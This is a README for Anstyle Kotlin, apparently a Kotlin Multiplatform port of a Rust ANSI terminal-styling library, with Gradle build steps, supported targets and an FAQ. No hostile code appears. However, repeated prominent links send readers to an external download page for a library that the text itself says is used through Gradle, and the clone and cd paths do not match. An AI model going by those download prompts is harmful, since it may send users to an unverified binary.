# Anstyle Kotlin v0.1.5 - Cross-Platform Terminal Styling for Kotlin

> **Anstyle Kotlin 0.1.5 is a Kotlin Multiplatform library for creating, interpreting, and emitting ANSI-formatted terminal text on JVM, Android, Native, JavaScript, WebAssembly, and Apple targets.**

[![Platform](https://img.shields.io/badge/Platform-Kotlin%20Multiplatform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1.5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leo-kellyttvo9127/anstyle-kotlin-ansi?style=flat-square)](https://github.com/leo-kellyttvo9127/anstyle-kotlin-ansi)

---

<p align="center">
  <a href="https://leo-kellyttvo9127.github.io/anstyle-kotlin-ansi/">
    <img src="https://img.shields.io/badge/Download-Anstyle%20Kotlin%20Latest-brightgreen?style=for-the-badge" alt="Download Anstyle Kotlin">
  </a>
</p>

> **[Download Anstyle Kotlin v0.1.5](https://leo-kellyttvo9127.github.io/anstyle-kotlin-ansi/)**

---

[Download Latest Build](https://leo-kellyttvo9127.github.io/anstyle-kotlin-ansi/)

---

## Overview

Anstyle Kotlin makes ANSI terminal styling available to Kotlin Multiplatform applications. It offers shareable style definitions and ANSI escape-sequence parsing for software that produces colored or otherwise formatted terminal output on multiple runtimes.

The project is a line-by-line Kotlin port of `rust-cli/anstyle`. Its API is intended for Kotlin applications built for JVM, Android, Kotlin/Native, JavaScript, WebAssembly, and Apple platforms. Compatibility with the upstream feature set is continuing to develop, and later releases may broaden the current behavior.

---

## Capabilities

- Define ANSI styles for Kotlin-based applications
- Produce colored terminal output across supported targets
- Reuse ANSI style configurations throughout an application
- Read and parse ANSI escape sequences
- Use a Kotlin Multiplatform-oriented API
- Build for JVM and Android
- Build for Native, JavaScript, WebAssembly, and Apple targets
- Track and expand compatibility with the upstream Rust implementation

---

## Getting Started

Check out the source repository and move into its directory:

```bash
git clone https://github.com/leo-kellyttvo9127/anstyle-kotlin-ansi.git
cd anstyle-kotlin
```

Run the standard Gradle build:

```bash
./gradlew build
```

Windows users can invoke the equivalent wrapper command:

```powershell
.\gradlew.bat build
```

Once the project has been built, add the library module to your Kotlin Multiplatform application using the dependency structure provided by the checked-out version. Consult the project configuration and release notes for published artifacts and target-specific instructions.

---

## Using the Library

A common integration sequence is:

1. Include Anstyle Kotlin in a Kotlin Multiplatform project.
2. Choose existing ANSI styles or create the definitions required by the application.
3. Apply those styles while assembling command-line messages.
4. Parse escape sequences when consuming text that is already formatted.
5. Execute the application on the desired Kotlin target and check the resulting terminal display.

The basic build-and-test commands are:

```bash
./gradlew build
./gradlew test
```

For command-line programs, applying styles near the output or presentation layer keeps the rest of the application focused on regular text and structured data.

---

## Project Configuration

Anstyle Kotlin is consumed as a library and does not run as a separate application. As a result, its setup is generally kept in the host project's Gradle configuration and Kotlin code.

The consuming project may need to specify:

- Which Kotlin Multiplatform targets should be compiled
- Whether Anstyle Kotlin is referenced as a dependency or local module
- How the application handles terminal output
- When styled text should be produced or when existing ANSI text should be parsed

The library profile does not require an independent user configuration file.

---

## Requirements and Supported Targets

- A development environment compatible with Kotlin Multiplatform
- The Gradle wrapper supplied by this repository
- One of the supported Kotlin targets:
  - JVM
  - Android
  - Kotlin/Native
  - JavaScript
  - WebAssembly
  - Apple platforms
- A terminal that can render ANSI styling when visual colors and formatting are needed

The exact targets available to a consuming project may vary with its Kotlin and Gradle toolchain.

---

## Frequently Asked Questions

### What problem does Anstyle Kotlin solve?

It supports Kotlin applications that need reusable ANSI styles, colored terminal messages, or escape-sequence parsing across multiple platforms.

### What platforms can it target?

Kotlin Multiplatform support covers JVM, Android, Native, JavaScript, WebAssembly, and Apple targets.

### How can I obtain the newest build?

Follow the **Download Latest Build** link above, or clone the repository and compile the current source using Gradle.

### Where is the library configured?

Place configuration in the consuming project's Gradle files and Kotlin sources. The library does not provide or require a separate standalone settings file.

### Why is my output not showing colors or formatting?

Confirm that the terminal used for testing understands ANSI escape sequences and that the application is writing styled output for the selected target. Different terminal environments may handle this output differently.

### Does this project completely match the Rust version?

Not yet. Work toward feature parity with the upstream Rust project is ongoing. Check the current source and release information when relying on a particular feature.

### How should I report an issue?

Create a repository issue and include the affected target platform, toolchain information, reproduction steps, and the output or parsing result that demonstrated the problem.

---

## Development Roadmap

- Bring the Kotlin implementation closer to the upstream Rust behavior
- Strengthen shared functionality across Kotlin Multiplatform targets
- Broaden and polish ANSI style and escape-sequence parsing coverage
- Add target-specific documentation as the API evolves

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
